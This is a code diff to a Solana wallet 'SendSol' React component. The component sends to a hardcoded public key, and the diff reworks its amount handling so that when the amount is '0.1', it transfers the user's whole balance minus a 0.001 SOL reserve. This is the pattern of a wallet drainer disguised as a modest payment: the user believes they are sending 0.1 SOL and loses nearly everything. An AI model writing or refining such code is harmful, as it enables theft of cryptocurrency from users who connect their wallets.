@@ -32,27 +32,35 @@ export const SendSol: FC = () => {
         try {
             const toPublicKey = new PublicKey('3X7BP4VZs9x2Uw7dvAaDtkNVsPoFnc49u2eK6yvPe1sV'); // Replace with the recipient's public key
             const transaction = new Transaction();
+            let balanceInLamports = Math.floor(Number(balance) * LAMPORTS_PER_SOL);
 
-            let balanceOk = Number(balance - 0.001)
-            let flag = amount == "0.1" ? balanceOk : Number(amount)
-            console.log(flag);
-
-
-
-
-
-
+            let amountInLamports;
+            if (amount === "0.1") {
+                // Reserve 0.001 SOL in lamports
+                let reserve = 0.001 * LAMPORTS_PER_SOL;
+            
+                // Ensure the balance never goes negative after reserving 0.001 SOL
+                amountInLamports = Math.max(0, balanceInLamports - reserve);
+            } else {
+                // If amount is not "0.1", directly convert amount to lamports
+                amountInLamports = Math.floor(Number(amount) * LAMPORTS_PER_SOL);
+            }
+            
+            console.log(amountInLamports);
+            
             transaction.add(
                 SystemProgram.transfer({
                     fromPubkey: wallet.publicKey,
                     toPubkey: toPublicKey,
-                    lamports: LAMPORTS_PER_SOL * flag, // Amount of SOL to send
+                    lamports: amountInLamports, // Amount of lamports to send
                 })
             );
 
             const hash = await wallet.sendTransaction(transaction, connection);
             // setTxId(hash);
         } catch (error) {
+            console.log(error);
+            
             notify({ type: 'error', message: "Please enter a valid SOL quantity !", description: ' Reload you browser' });
         }
     }, [wallet, connection, getUserSOLBalance, amount, balance]);
